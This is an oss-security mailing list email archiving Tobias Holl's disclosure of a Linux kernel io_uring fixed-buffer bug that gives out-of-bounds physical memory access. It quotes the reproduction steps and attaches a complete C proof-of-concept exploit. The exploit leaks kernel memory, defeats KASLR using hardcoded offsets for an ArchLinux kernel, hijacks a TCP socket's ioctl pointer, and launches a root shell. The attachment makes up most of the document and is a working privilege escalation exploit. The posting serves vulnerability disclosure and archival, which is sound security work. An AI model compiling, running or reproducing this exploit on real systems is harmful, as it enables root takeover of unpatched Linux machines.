Received: (qmail 5749 invoked by uid 550); 10 May 2023 17:07:44 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 5436 invoked from network); 10 May 2023 17:07:15 -0000
Date: Wed, 10 May 2023 19:07:10 +0200
From: Solar Designer <solar@openwall.com>
To: oss-security@lists.openwall.com
Cc: Tobias Holl <tobias@tholl.xyz>
Message-ID: <20230510170709.GA26773@openwall.com>
References: <e18a885b-de15-c287-e4a4-a0df7904f15f@tholl.xyz>
Mime-Version: 1.0
Content-Type: multipart/mixed; boundary="4Ckj6UjgE2iN1+kY"
Content-Disposition: inline
In-Reply-To: <e18a885b-de15-c287-e4a4-a0df7904f15f@tholl.xyz>
User-Agent: Mutt/1.4.2.3i
Subject: Re: [oss-security] Linux kernel io_uring out-of-bounds access to physical memory

--4Ckj6UjgE2iN1+kY
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

On Mon, May 08, 2023 at 04:01:59PM +0200, Tobias Holl wrote:
> TL;DR bug reproduction steps:
>  1. Create a memfd
>  2. fallocate a single page in that file descriptor
>  3. Use MAP_FIXED to map this page repeatedly, in consecutive locations
>  4. Register the entire region that you just filled up with that page as
>     a fixed buffer with IORING_REGISTER_BUFFERS
>  5. Use IORING_OP_WRITE_FIXED to write the buffer to some other file
>     (OOB read) or IORING_OP_READ_FIXED to read data into the buffer (OOB
>     write).
> 
> Of course, from there, we can simply find any interesting object in
> physical memory and start overwriting function pointers to get code
> execution and escalate privileges. A full proof-of-concept exploit with
> a bit more robustness can be found at
>   https://tholl.xyz/static/bugs/2023-io_uring-fixed-buffers/exploit.c

I initially overlooked that the exploit was only shared by reference.
Let's have it right in here for archival.  Attached.

Alexander

--4Ckj6UjgE2iN1+kY
Content-Type: text/x-c; charset=us-ascii
Content-Disposition: attachment; filename="exploit.c"

// normal: gcc -Wall -Wextra -std=gnu17 -Os -s exploit.c -luring -o exploit
// static: gcc -Wall -Wextra -std=gnu17 -static -Os -s exploit.c liburing.a -o exploit
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <liburing.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/param.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

// {{{ Logging
#define progress(it, count, fmt, ...) do { \
        dprintf(STDOUT_FILENO, "%8.3f | " fmt "\r", elapsed_wall_time(), it, count, ##__VA_ARGS__); \
        if ((it) == ((count))) \
            dprintf(STDOUT_FILENO, "\n"); \
    } while (0)
#define log(fmt, ...) do { dprintf(STDOUT_FILENO, "%8.3f | " fmt "\n", elapsed_wall_time(), ##__VA_ARGS__); } while (0)
#define die(fmt, ...) do { dprintf(STDERR_FILENO, fmt "\n", ##__VA_ARGS__); exit(-1); } while (0)

static struct timespec startup_time;
__attribute__((constructor)) static void initialize_wall_time(void)
{
    if (clock_gettime(CLOCK_MONOTONIC_RAW, &startup_time))
        die("Failed to get current time: %m");
}

static inline double elapsed_wall_time(void)
{
    struct timespec time;
    if (clock_gettime(CLOCK_MONOTONIC_RAW, &time))
        die("Failed to get current time: %m");
    if (time.tv_nsec < startup_time.tv_nsec) {
        time.tv_nsec += 1000000000ul;
        time.tv_sec -= 1;
    }
    return (double) (time.tv_sec - startup_time.tv_sec) + \
           (double) (time.tv_nsec - startup_time.tv_nsec) / 1000000000.0;
}
// }}}

// {{{ Utilities and little helpers
#define set_errno(...) ({ typeof(__VA_ARGS__) _res = (__VA_ARGS__); if (_res < 0) errno = -_res; _res; })
#define describe(...) static const struct { const size_t __VA_ARGS__; struct { size_t size; } meta; }
#define as(type, ptr) ((type *) (ptr))[0] /* Array access instead of deref to avoid reinterpretation as multiplication */
#define array_size(arr) (sizeof(arr) / sizeof((arr)[0]))

size_t read_int(const char *path, size_t default_value)
{
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        log("Failed to open %s: %m", path);
        return default_value;
    }

    char buffer[64];
    ssize_t bytes = read(fd, buffer, sizeof(buffer));
    size_t value = default_value;
    if (bytes < 0) {
        log("Failed to read from %s: %m", path);
        goto close_fd;
    }

    errno = 0;
    value = strtoull(buffer, NULL, 10);
    if (errno) {
        log("Failed to convert %s (from %s) to a number: %m", buffer, path);
        value = default_value;
        goto close_fd;
    }

close_fd:
    close(fd);
    return value;
}

static inline char *copy_string(char *to, const char *from)
{
    return stpcpy(to, from) + 1;
}

static inline void hexdump(char *data, uintptr_t addr, size_t count)
{
    for (size_t offset = 0; offset < count; offset += 16) {
        dprintf(STDOUT_FILENO, "%08lx: ", addr + offset);
        for (int i = 0; i < 16; ++i) {
            if (offset + i < count)
                dprintf(STDOUT_FILENO, "%02x", (unsigned) (unsigned char) data[offset + i]);
            else
                dprintf(STDOUT_FILENO, "  ");
            if (i % 2)
                dprintf(STDOUT_FILENO, " ");
        }
        dprintf(STDOUT_FILENO, "  ");
        for (int i = 0; i < 16 && offset + i < count; ++i) {
            if (data[offset + i] >= 0x20 && data[offset + i] <= 0x7e)
                dprintf(STDOUT_FILENO, "%c", data[offset + i]);
            else
                dprintf(STDOUT_FILENO, ".");
        }
        dprintf(STDOUT_FILENO, "\n");
    }
    dprintf(STDOUT_FILENO, "\n");
}
// }}}

// Structure layouts, KASLR offsets, and SLAB data
describe(sk_prot, sk_error_queue_list_next, sk_pacing_rate, sk_max_pacing_rate, sk_error_report,
         size, usable) tcp_sock = {
    .sk_prot                  = 0x028,
    .sk_error_queue_list_next = 0x0d8,
    .sk_pacing_rate           = 0x1c8,
    .sk_max_pacing_rate       = 0x1d0,
    .sk_error_report          = 0x2b8,

    // NB: In our case, this is inside a tcp_sock. struct sock is only 0x2f8 bytes.
    .size                     = 0x8a0,
    .usable                   = 0x2f8, // From here, it's TCP-specific stuff, we'll just overwrite that.
};

describe(ioctl, size) proto = {
    .ioctl = 0x028,
    .size  = 0x1b8,
};

describe(data, entry_next, entry_prev, func, size) work_struct = {
    .data       = 0x00,
    .entry_next = 0x08,
    .entry_prev = 0x10,
    .func       = 0x18,

    .size       = 0x20,
};

describe(work, path, argv, envp, init, cleanup) subprocess_info = {
    .work    = 0x00,
    .path    = 0x28,
    .argv    = 0x30,
    .envp    = 0x38,
    .init    = 0x48,
    .cleanup = 0x50,
};

describe(call_usermodehelper_exec, call_usermodehelper_exec_work, sock_def_error_report) kaslr = {
    // ArchLinux [core]/linux 6.3.1.arch1-1
    .call_usermodehelper_exec      = 0x0d3d60,
    .call_usermodehelper_exec_work = 0x0d4170,
    .sock_def_error_report         = 0xac9650,
};

// Use io_uring to write data from a fixed buffer (ptr must point into the buffer with the given index)
// to another file descriptor at offset 0.
void io_uring_write_fixed(int fd, struct io_uring *ring, const char *ptr, size_t size, size_t buffer)
{
    // Avoid incomplete writes, just in case they do happen.
    for (size_t to_write = size; to_write > 0;) {
        // Create an IORING_OP_WRITE_FIXED SQE
        struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
        if (!sqe)
            die("Failed to obtain SQE: ring is full");
        io_uring_prep_write_fixed(sqe, fd, ptr, to_write, size - to_write, buffer);

        // Submit the write to the io_uring
        if (set_errno(io_uring_submit(ring)) < 0)
            die("Failed to submit IORING_OP_WRITE_FIXED: %m");

        // Wait for completion, and mark the CQE as read to free it up for the next round.
        struct io_uring_cqe *cqe;
        if (set_errno(io_uring_wait_cqe(ring, &cqe)) < 0)
            die("Failed to wait for CQE: %m");
        int32_t res = cqe->res;
        io_uring_cqe_seen(ring, cqe);

        // Check the result of the write
        if (set_errno(res) < 0)
            die("IORING_OP_WRITE_FIXED failed: %m");
        else if ((size_t) res == to_write)
            break;
        to_write -= res;
        ptr += res;
    }
}

// Use io_uring to read data to a fixed buffer (ptr must point into the buffer with the given index)
// from another file descriptor at the given offset.
void io_uring_read_fixed(int fd, struct io_uring *ring, char *ptr, size_t size, off_t offset, size_t buffer)
{
    // Avoid incomplete reads, just in case they do happen.
    for (size_t to_read = size; to_read > 0;) {
        // Create an IORING_OP_READ_FIXED SQE
        struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
        if (!sqe)
            die("Failed to obtain SQE: ring is full");
        io_uring_prep_read_fixed(sqe, fd, ptr, to_read, offset + size - to_read, buffer);

        // Submit the read to the io_uring
        if (set_errno(io_uring_submit(ring)) < 0)
            die("Failed to submit IORING_OP_READ_FIXED: %m");

        // Wait for completion, and mark the CQE as read to free it up for the next round.
        struct io_uring_cqe *cqe;
        if (set_errno(io_uring_wait_cqe(ring, &cqe)) < 0)
            die("Failed to wait for CQE: %m");
        int32_t res = cqe->res;
        io_uring_cqe_seen(ring, cqe);

        // Check the result of the read
        if (set_errno(res) < 0)
            die("IORING_OP_READ_FIXED failed: %m");
        else if ((size_t) res == to_read)
            break;
        to_read -= res;
        ptr += res;
    }
}

// The actual exploit code
int main(int argc, char *argv[])
{
    // Argument parsing
    bool verbose = false;
    bool continue_after_exploit = false;
    char *command = NULL;
    const char *tty = NULL;
    for (int i = 1; i < argc; ++i) {
        if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0)
            die("Usage: %s [-cv] [-t tty | command]", argv[0]);
        else if (strcmp(argv[i], "-c") == 0 || strcmp(argv[i], "--continue") == 0)
            continue_after_exploit = true;
        else if (strcmp(argv[i], "-v") == 0 || strcmp(argv[i], "--verbose") == 0)
            verbose = true;
        else if (strcmp(argv[i], "-t") == 0 || strcmp(argv[i], "--tty") == 0)
            tty = argv[++i];
        else if (argv[i][0] == '-')
            die("Unknown option: %s", argv[i]);
        else if (!command)
            command = argv[i];
        else
            die("Unexpected argument: %s", argv[i]);
    }

    // Sanity checks on the structure layouts
    // Objects of these two types will overlap, and we need to set both to different values. If the
    // offsets are the same, the exploit can't work.
    if (subprocess_info.work <= tcp_sock.sk_prot && subprocess_info.work + work_struct.size > tcp_sock.sk_prot)
        die("tcp_sock.sk_prot overlaps subprocess_info.work");
    if (tcp_sock.sk_prot == subprocess_info.init || tcp_sock.sk_prot == subprocess_info.cleanup)
        die("tcp_sock.sk_prot overlaps subprocess_info.init or subprocess_info.cleanup");

    // Set up the default command: /bin/sh <$(tty) &>$(tty)
    // This should end up giving us a (root) shell that talks to the current TTY, i.e. is interactive
    if (!command) {
        if (!tty)
            tty = ttyname(STDIN_FILENO);
        if (!tty)
            die("Failed to obtain TTY name, and no command or TTY was specified: %m");
        if (asprintf(&command, "/bin/sh <%1$s &>%1$s", tty) == -1)
            die("Failed to construct default command");
        log("No command specified, using %s", command);
    }

    // Pin this thread to the current CPU for heap grooming later on (SLUB has per-CPU caches, etc.)
    cpu_set_t cpus;
    CPU_ZERO(&cpus);
    CPU_SET(sched_getcpu(), &cpus);
    sched_setaffinity(0, sizeof(cpus), &cpus);

    // Get the page size for later (I expect this to be 0x1000, but you never know).
    long page_size = sysconf(_SC_PAGESIZE);
    if (page_size < 0)
        die("Failed to get page size: %m");

    // Find out how many memory mappings we are allowed to have. To do this, parse
    // /proc/sys/vm/max_map_count if it exists. Otherwise, use a sane default.
    const size_t nr_pages = read_int("/proc/sys/vm/max_map_count", 65536) - 64;

    // Try to increase the file limit as much as possible to allow us to spray more objects, but
    // don't go completely overboard with actually doing that.
    struct rlimit max_files;
    if (getrlimit(RLIMIT_NOFILE, &max_files))
        die("Failed to query maximum number of files: %m");
    if (max_files.rlim_cur < max_files.rlim_max) {
        max_files.rlim_cur = max_files.rlim_max;
        if (setrlimit(RLIMIT_NOFILE, &max_files))
            die("Failed to set maximum number of files to the hard limit (%ld): %m", max_files.rlim_max);
    }
    const size_t nr_fds = MIN(max_files.rlim_cur, 65536) - 16;
    const size_t nr_sockets = nr_fds / 2;
    const size_t nr_files = nr_fds - nr_sockets;

    // Create our victim objects now. The way the buddy allocator works, we should get lucky and have
    // some of our victim objects after the actual exploit objects.
    // Here, I use normal TCP sockets (we will later gain code execution using the sk->sk_prot->ioctl
    // override in inet_ioctl).
    int *sockets = calloc(nr_sockets, sizeof(*sockets));
    if (!sockets)
        die("Failed to allocate memory");
    unsigned long id_pacing_rate_mask = (1ul << (64 - __builtin_clzl(nr_files))) - 1;
    unsigned long id_pacing_rate = 0xf44ff44ff44ff44f & ~id_pacing_rate_mask;
    for (size_t i = 0; i < nr_sockets; ++i) {
        if ((sockets[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
            die("Failed to create socket (%zu): %m", i + 1);
        unsigned long pacing_rate = id_pacing_rate | i;
        if (setsockopt(sockets[i], SOL_SOCKET, SO_MAX_PACING_RATE, &pacing_rate, sizeof(pacing_rate)) < 0)
            die("Failed to set pacing rate on socket (%zu): %m", i + 1);
        progress(i + 1, nr_sockets, "Created %zu / %zu victim objects");
    }

    // Create single-page shared memory files (here via memfd_create, but shmem_open or similar things
    // would also work).
    // It would be nice to be able to use MFD_HUGETLB here (then we'd be able to scan much more memory
    // from a single file, so we'd need less files overall), but that only works if hugetlbfs is both
    // enabled and set up (which it usually isn't). This restriction also applies to most other ways of
    // getting hugetlb pages, so we just stick with heap grooming to ensure we get our target object in
    // a nice place.
    int *memfds = calloc(nr_files, sizeof(*memfds));
    if (!memfds)
        die("Failed to allocate memory");
    for (size_t i = 0; i < nr_files; ++i) {
        if ((memfds[i] = memfd_create("hlt", MFD_CLOEXEC)) < 0)
            die("Failed to create memfd (%zu): %m", i);
        if (fallocate(memfds[i], 0, 0, page_size))
            die("Failed to allocate shared memory for memfd (%zu): %m", i);
        progress(i + 1, nr_files, "Created %zu / %zu files");
    }

    // We will leak memory in 256 page chunks later on. This should help us with running off the end
    // (and crashing the kernel) on smaller systems.
    const size_t chunk_size = 256 * page_size;

    // Set up a last memfd that we can write leaked memory to, and map it so we always have it around.
    int leak_memfd = memfd_create("leak", MFD_CLOEXEC);
    if (leak_memfd < 0)
        die("Failed to create leak memfd: %m");
    if (fallocate(leak_memfd, 0, 0, chunk_size))
        die("Failed to allocate shared memory for leak memfd: %m");
    char *leak = mmap(NULL, chunk_size, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, leak_memfd, 0);
    if (leak == MAP_FAILED)
        die("Failed to map leak memfd into memory: %m");

    // Set up the io_uring that we'll use to trigger the bug.
    struct io_uring ring;
    if (set_errno(io_uring_queue_init(16, &ring, 0)))
        die("Failed to create io_uring: %m");

    // Use our bug to leak memory from each of the files we just created. In the leaked memory, try to
    // find an overlapped page that we can control. This way, we can try to place another object in that
    // page without running into too much heap trouble even on systems that have much more memory than
    // the 256MiB that we can read with the usual vm.max_map_count settings.
    bool exploited = false;
    for (size_t i = 0; i < nr_files && !exploited; ++i) {
        // Set up consecutive mappings of the memfd page, as often as possible. There's no need to
        // MAP_POPULATE this, since adding the buffer will pin the memory anyways.
        char *const mapping = (char *) 0xf400000000ul;
        for (size_t j = 0; j < nr_pages; ++j) {
            void *addr = mapping + j * page_size;
            if (mmap(addr, page_size, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, memfds[i], 0) != addr)
                die("Failed to map memory (file %zu, page %zu): %m", i + 1, j + 1);
        }
        size_t mapping_size = nr_pages * page_size;

        // Add the mappings as a single contiguous buffer. This should trigger the bug.
        struct iovec buffer = { .iov_base = mapping, .iov_len = mapping_size };
        if (set_errno(io_uring_register_buffers(&ring, &buffer, 1)))
            die("Failed to register buffer: %m");

        // To leak memory, we now write the buffer contents to a file descriptor in 256 page chunks.
        for (size_t offset = 0; offset < mapping_size && !exploited; offset += chunk_size) {
reload:
            size_t this_chunk_size = MIN(chunk_size, mapping_size - offset);
            io_uring_write_fixed(leak_memfd, &ring, mapping + offset, this_chunk_size, 0);

            // Look at the memory that we just leaked. Our data is 8-byte aligned.
            for (size_t inner_offset = 0; inner_offset < this_chunk_size; inner_offset += 8) {
                // Check that we can even find a complete object at this location
                if (offset + inner_offset < tcp_sock.sk_pacing_rate)
                    continue;
                if (offset + inner_offset > mapping_size - tcp_sock.size + tcp_sock.sk_pacing_rate)
                    break;

                // Try to find the identifier we placed in our victim objects earlier.
                // Note that we set both sk_pacing_rate and sk_max_pacing_rate at the same time, so
                // we also want to check that they are equal.
                unsigned long pacing_rate = as(unsigned long, leak + inner_offset);
                if ((pacing_rate & ~id_pacing_rate_mask) != id_pacing_rate)
                    continue;
                // Be careful, this might straddle the chunk boundary and overflow.
                // If it does, assume we have a hit anyways - reload will check again.
                ssize_t other_offset = inner_offset + tcp_sock.sk_max_pacing_rate - tcp_sock.sk_pacing_rate;
                if (other_offset >= 0 && (size_t) other_offset < this_chunk_size - sizeof(unsigned long))
                    if (as(unsigned long, leak + other_offset) != pacing_rate)
                        continue;

                // Found a match, try to grab the index of the victim object.
                size_t victim_index = pacing_rate & id_pacing_rate_mask;
                if (victim_index >= nr_files)
                    continue;

                // Align to the start of the object. If the object is only partially in our chunk,
                // reload the data.
                size_t object_offset = offset + inner_offset - tcp_sock.sk_pacing_rate;
                char *object = leak + inner_offset - tcp_sock.sk_pacing_rate;
                if (inner_offset < tcp_sock.sk_pacing_rate
                        || inner_offset > this_chunk_size - tcp_sock.size + tcp_sock.sk_pacing_rate) {
                    // Reload data at the actual object offset. This way we should get the complete
                    // victim object, and not just part of it.
                    offset = object_offset;
                    goto reload;
                }

                // Make sure we have the entire object, otherwise our writes later will cause trouble.
                if (this_chunk_size < tcp_sock.size)
                    continue;

                log("File %zu overlaps object %zu at offset %zx", i + 1, victim_index + 1, object_offset);
                if (verbose)
                    hexdump(object, 0, tcp_sock.size);

                // Now that we have an object, do the exploiting. First, break KASLR.
                uintptr_t sock_def_error_report = as(uintptr_t, object + tcp_sock.sk_error_report);
                uintptr_t kaslr_base = sock_def_error_report - kaslr.sock_def_error_report;
                log("KASLR base is at %" PRIxPTR, kaslr_base);

                uintptr_t self_referential_pointer = as(uintptr_t, object + tcp_sock.sk_error_queue_list_next);
                uintptr_t object_addr = self_referential_pointer - tcp_sock.sk_error_queue_list_next;
                log("Victim object is at %" PRIxPTR, object_addr);

                // Keep a backup copy of the object around to restore it later (we don't want to crash
                // the system accidentally).
                void *backup_copy = malloc(tcp_sock.size);
                if (!backup_copy)
                    die("Failed to allocate memory");
                memcpy(backup_copy, object, tcp_sock.size);

                // Now, modify the object.
                // First, set sock->sk_prot to point behind the struct sock (into the tcp_sock)
                as(uintptr_t, object + tcp_sock.sk_prot) = object_addr + tcp_sock.usable;
                // Now, set sock->sk_prot->ioctl to our target code
                as(uintptr_t, object + tcp_sock.usable + proto.ioctl) = kaslr_base + kaslr.call_usermodehelper_exec;
                // Store our strings behind the fake proto object
                char *argv0 = object + tcp_sock.usable + proto.size;
                char *argv1 = copy_string(argv0, "/bin/sh");
                char *argv2 = copy_string(argv1, "-c");
                char *end   = copy_string(argv2, command);
                uintptr_t ptr_to_argv0 = object_addr + (argv0 - object);
                uintptr_t ptr_to_argv1 = object_addr + (argv1 - object);
                uintptr_t ptr_to_argv2 = object_addr + (argv2 - object);
                // Store argv behind the strings
                uintptr_t *kernel_argv = (uintptr_t *) end;
                kernel_argv[0] = ptr_to_argv0;
                kernel_argv[1] = ptr_to_argv1;
                kernel_argv[2] = ptr_to_argv2;
                kernel_argv[3] = 0;
                uintptr_t ptr_to_argv = object_addr + (end - object);

                // We will call sock->sk_prot->ioctl(sk, (int) command, arg) later. Unfortunately, there
                // are no super-nice function pointers where we control everything, so we just use
                // call_usermodehelper_exec, where we only need to overwrite data in the first argument.
                // This means we need to put a struct subprocess_info at the start of the socket.
                // Be careful not to overwrite the sk_prot that we just set!

                as(uintptr_t, object + subprocess_info.work + work_struct.data) = 0;
                as(uintptr_t, object + subprocess_info.work + work_struct.entry_next) = object_addr + subprocess_info.work + work_struct.entry_next;
                as(uintptr_t, object + subprocess_info.work + work_struct.entry_prev) = object_addr + subprocess_info.work + work_struct.entry_next;
                as(uintptr_t, object + subprocess_info.work + work_struct.func) = kaslr_base + kaslr.call_usermodehelper_exec_work;

                if (subprocess_info.path == tcp_sock.sk_prot)
                    strcpy(object + tcp_sock.usable, "/bin/sh");
                else
                    as(uintptr_t, object + subprocess_info.path) = ptr_to_argv0;

                if (subprocess_info.argv == tcp_sock.sk_prot)
                    memcpy(object + tcp_sock.usable, kernel_argv, 4 * sizeof(uintptr_t));
                else
                    as(uintptr_t, object + subprocess_info.argv) = ptr_to_argv;

                if (subprocess_info.envp == tcp_sock.sk_prot)
                    as(uintptr_t, object + tcp_sock.usable) = 0; // This is actually an empty envp
                else
                    as(uintptr_t, object + subprocess_info.envp) = 0; // No envp at all by default

                as(uintptr_t, object + subprocess_info.init) = 0;
                as(uintptr_t, object + subprocess_info.cleanup) = 0;

                // Now everything should be ready to go
                if (verbose)
                    hexdump(object, object_addr, tcp_sock.size);

                // Write back our changes to the buffer.
                io_uring_read_fixed(leak_memfd, &ring, mapping + object_offset, tcp_sock.size, object_offset - offset, 0);

                // Calling ioctl on our victim object should now do the right thing.
                exploited = (ioctl(sockets[victim_index], 0xf4f4f4f4, 0) == 0);
                if (!exploited)
                    log("Failed to invoke custom ioctl: %m");
                else
                    log("Done");

                // Restore the socket
                memcpy(object, backup_copy, tcp_sock.size);
                io_uring_read_fixed(leak_memfd, &ring, mapping + object_offset, tcp_sock.size, object_offset - offset, 0);

                // We are done, just do the cleanup.
                break;
            }
        }

        // Clean up: Remove the buffer from the io_uring and unmap the memory.
        io_uring_unregister_buffers(&ring);
        if (munmap(mapping, mapping_size))
            die("Failed to unmap memory (file %zu): %m", i + 1);

        // Log progress only if we haven't actually exploited this thing yet and are still going.
        if (!exploited)
            progress(i + 1, nr_files, "Checked %zu / %zu files");
    }

    // Clean up: Destroy the io_uring
    io_uring_queue_exit(&ring);

    // Clean up: Destroy the leak memfd
    if (munmap(leak, chunk_size))
        die("Failed to unmap leak memfd: %m");
    if (close(leak_memfd))
        die("Failed to close leak memfd: %m");

    // Clean up: Destroy all the other memfds
    for (size_t i = 0; i < nr_files; ++i)
        if (memfds[i] != -1 && close(memfds[i]))
            die("Failed to close memfd (%zu): %m", i);
    free(memfds);

    // Clean up: Destroy all the victim objects, except for the one that we are actually using.
    for (size_t i = 0; i < nr_sockets; ++i)
        if (sockets[i] != -1 && close(sockets[i]))
            die("Failed to close socket (%zu): %m", i);
    free(sockets);

    // Check whether we won.
    if (!exploited)
        die("Exploitation failed, please try again");

    // Block the parent shell so we don't compete over the terminal. This isn't always necessary, but
    // it doesn't really cause harm either.
    // It would be nicer to waitpid() here, but we can't waitpid() across PID namespaces.
    if (!continue_after_exploit)
        for (;;)
            sleep(60);

    return 0;
}

// vim:ts=4:sw=4:foldmethod=marker:foldlevel=0:

--4Ckj6UjgE2iN1+kY--
